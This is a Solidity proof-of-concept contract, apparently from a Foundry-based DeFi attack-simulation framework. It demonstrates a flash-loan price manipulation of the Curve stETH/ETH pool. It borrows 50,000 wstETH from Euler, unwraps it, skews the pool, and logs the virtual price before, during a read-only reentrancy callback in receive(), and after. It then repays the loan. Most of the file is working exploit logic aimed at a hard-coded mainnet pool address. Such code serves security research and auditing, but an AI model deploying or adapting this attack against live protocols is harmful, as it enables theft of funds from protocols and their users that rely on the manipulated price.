pragma solidity ^0.8.0;

import "../PriceManipulation.sol";
import "../../tokens/Tokens.sol";
import "../../flashloan/FlashLoan.sol";

import "../lib/CurvePriceManipulation.sol";

import "forge-std/console.sol";
import "forge-std/Test.sol";

contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
    using FlashLoanProvider for FlashLoanProviders;

    function initiateAttack() external override {
        console.log("---------------------------------------------------------------------------");
        console.log("Curve Virtual Price BEFORE:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
        // deal(EthereumTokens.stETH, address(this), 5e18);
        deal(EthereumTokens.NATIVE_ASSET, address(this), 50000e18);
        takeFlashLoan(FlashLoanProviders.EULER, EthereumTokens.wstETH, 50000e18);
    }
    function _executeAttack() internal override(PriceManipulation, FlashLoan) {
        // Unwrap flash loaned wstETH to manipulate Curve pool
        IWrapped(address(EthereumTokens.wstETH)).unwrap(50000e18);
        console.log("ETH   :", address(this).balance);
        console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));

        CurvePriceManipulation.manipulatePoolPrice(EthereumTokens.ETH, EthereumTokens.stETH, 50000e18, 50000e18);
        
        console.log("---------------------------------------------------------------------------");
        console.log("PAY BACK");
        console.log("ETH   :", address(this).balance);
        console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
        // Wrap stETH to pay back flash loan
        EthereumTokens.stETH.approve(address(EthereumTokens.wstETH), type(uint256).max);
        IWrapped(address(EthereumTokens.wstETH)).wrap(EthereumTokens.stETH.balanceOf(address(this)));
    }

    function _completeAttack() internal override(PriceManipulation, FlashLoan) {
        console.log("---------------------------------------------------------------------------");
        console.log("Curve Virtual Price AFTER:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
        console.log("ETH   :", address(this).balance);
        console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
        console.log("wstETH:", EthereumTokens.wstETH.balanceOf(address(this)));
    }

    receive() external payable override {
        // Execute read only reentrancy
        // Caller should be curve pool
        console.log("---------------------------------------------------------------------------");
        console.log("Curve Virtual Price DURING:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
        console.log("ETH   :", address(this).balance);
        console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
    }

    fallback() external payable override(FlashLoan, Reentrancy) {
        FlashLoan._fallback();
    }
}

interface IPool {
    function get_virtual_price() external view returns (uint256);
}

interface IWrapped {
    function wrap(uint256) external;
    function unwrap(uint256) external;
}